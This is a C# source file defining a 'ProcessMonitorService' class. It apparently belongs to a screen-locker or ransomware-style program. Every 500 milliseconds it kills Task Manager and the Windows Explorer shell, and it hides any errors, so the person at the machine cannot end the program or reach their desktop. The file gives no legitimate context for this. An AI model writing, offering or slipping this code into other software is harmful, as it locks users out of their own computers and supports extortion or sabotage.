using System;
using System.Diagnostics;
using System.Windows.Threading;

namespace naiwa
{
    public class ProcessMonitorService
    {
        private DispatcherTimer? _monitorTimer;
        private readonly string[] _targetProcesses = { "Taskmgr", "explorer" };

        public void StartMonitoring()
        {
            StopMonitoring();
            _monitorTimer = new DispatcherTimer { Interval = TimeSpan.FromMilliseconds(500) };
            _monitorTimer.Tick += Monitor_Tick;
            _monitorTimer.Start();
        }

        public void StopMonitoring()
        {
            if (_monitorTimer != null)
            {
                _monitorTimer.Stop();
                _monitorTimer = null;
            }
        }

        private void Monitor_Tick(object? sender, EventArgs e)
        {
            try
            {
                foreach (var processName in _targetProcesses)
                {
                    foreach (var process in Process.GetProcessesByName(processName))
                    {
                        process.Kill();
                    }
                }
            }
            catch
            {
            }
        }

        public void KillExplorer()
        {
            try
            {
                foreach (var process in Process.GetProcessesByName("explorer"))
                {
                    process.Kill();
                }
            }
            catch
            {
            }
        }
    }
}
